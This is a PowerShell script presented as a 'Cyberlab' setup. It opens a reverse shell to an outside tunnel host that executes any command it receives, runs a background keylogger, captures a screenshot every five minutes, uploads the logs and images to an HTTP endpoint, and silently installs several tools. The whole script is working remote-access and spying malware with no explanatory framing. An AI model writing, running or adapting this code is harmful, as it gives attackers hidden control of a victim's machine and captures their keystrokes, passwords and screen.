# Create working directory
New-Item -ItemType Directory -Path "C:\Cyberlab" -Force | Out-Null

# Reverse shell to Termux
$client = New-Object System.Net.Sockets.TCPClient("mycyberlab.loca.lt", 4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
$sendback2 = "Connected to Cyberlab`nPS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush();
Start-Sleep -Milliseconds 500

# Background thread for reverse shell
$job = Start-Job -ScriptBlock {
    param($client, $stream, $bytes)
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (Invoke-Expression $data 2>&1 | Out-String );
        $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    }
    $client.Close()
} -ArgumentList $client, $stream, $bytes

# Keystroke logging
$keylog = Start-Job -ScriptBlock {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Keyboard {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int vKey);
    }
    "@
    $logfile = "C:\Cyberlab\keystrokes.log"
    while ($true) {
        Start-Sleep -Milliseconds 100
        for ($i = 0; $i -lt 255; $i++) {
            if ([Keyboard]::GetAsyncKeyState($i) -eq -32767) {
                $key = [char]$i
                $key | Out-File -FilePath $logfile -Append
            }
        }
        Start-Sleep -Seconds 60
        try {
            Invoke-WebRequest -Uri "http://localhost:8080/upload" -Method POST -InFile $logfile -ErrorAction SilentlyContinue
        } catch {}
    }
}

# Screenshot capture
$screenshot = Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Windows.Forms
    while ($true) {
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
        $filename = "C:\Cyberlab\screenshot_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".png"
        $bitmap.Save($filename)
        try {
            Invoke-WebRequest -Uri "http://localhost:8080/upload" -Method POST -InFile $filename -ErrorAction SilentlyContinue
        } catch {}
        Remove-Item $filename
        Start-Sleep -Seconds 300
    }
}

# Install tools
try {
    Invoke-WebRequest -Uri "https://2.na.dl.wireshark.org/win64/Wireshark-latest-x64.exe" -OutFile "C:\Cyberlab\wireshark.exe"
    Start-Process -FilePath "C:\Cyberlab\wireshark.exe" -ArgumentList "/S" -Wait
} catch {}
try {
    Invoke-WebRequest -Uri "https://portswigger.net/burp/releases/download?type=Jar" -OutFile "C:\Cyberlab\burpsuite.jar"
} catch {}
try {
    Invoke-WebRequest -Uri "https://download.mql5.com/cdn/web/metaquotes.software.corp/mt5/mt5setup.exe" -OutFile "C:\Cyberlab\mt5setup.exe"
    Start-Process -FilePath "C:\Cyberlab\mt5setup.exe" -ArgumentList "/auto" -Wait
} catch {}
try {
    wsl --install -d kali-linux --no-launch
} catch {}

# Keep script running
Wait-Job -Job $job
